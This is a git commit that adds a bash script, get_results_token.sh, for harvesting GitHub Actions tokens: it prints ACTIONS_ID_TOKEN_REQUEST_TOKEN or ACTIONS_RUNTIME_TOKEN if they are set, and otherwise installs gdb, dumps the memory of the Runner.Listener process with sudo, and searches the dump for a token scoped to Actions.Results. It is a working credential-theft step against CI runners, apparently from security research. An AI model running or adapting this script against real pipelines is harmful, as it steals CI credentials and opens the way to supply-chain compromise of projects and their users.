d691666e011a7357a4bee495c82949f28a90f1f5
Imre Rad <radimre83@gmail.com>
2025-02-23 09:25:17 +0100

    stuff

---
+++ get_results_token.sh
@@ -0,0 +1,32 @@
+#!/bin/bash
+
+if [[ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ]]; then
+   >&2 echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN present already"
+   echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN"
+   exit 0
+fi
+
+if [[ -n "$ACTIONS_RUNTIME_TOKEN" ]]; then
+   >&2 echo "ACTIONS_RUNTIME_TOKEN present already"
+   echo "$ACTIONS_RUNTIME_TOKEN"
+   exit 0
+fi
+
+
+>&2 echo "Trying to extract it from the Runner's memory"
+
+sudo apt -y install gdb
+(cd /tmp && sudo $(realpath $(dirname $0))/dump.sh $(pidof Runner.Listener))
+tokens="$(python3 ./idtoken_extractor.py /tmp)"
+
+for token in $tokens; do
+  if echo $token | cut -d. -f2 | base64 -d 2>/dev/null | jq .scp| grep Actions.Results >/dev/null 2>&1; then
+     >&2 echo "Found!"
+     echo $token
+     exit 0
+  fi
+done
+
+>&2 echo "Not found :("
+
+exit 1
